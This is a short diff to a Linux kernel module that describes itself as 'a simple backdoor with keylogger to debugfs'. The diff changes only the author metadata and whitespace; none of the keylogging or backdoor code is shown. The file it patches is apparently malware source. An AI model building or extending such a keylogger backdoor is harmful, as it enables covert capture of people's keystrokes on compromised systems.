@@ -10,7 +10,8 @@
 #define KBD_IRQ 1  // Keyboard IRQ number
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Yudi");
+MODULE_AUTHOR("Yudi Ramos");
+MODULE_AUTHOR("Cauê Cermak");
 MODULE_VERSION("1.0");
 MODULE_DESCRIPTION("A simple backdoor with keylogger to debugfs");
 
@@ -120,6 +121,7 @@ static void __exit keyboard_module_exit(void)
 
     printk(KERN_INFO "Keyboard module exited\n");
 }
+
 
 module_init(keyboard_module_init);
 module_exit(keyboard_module_exit);
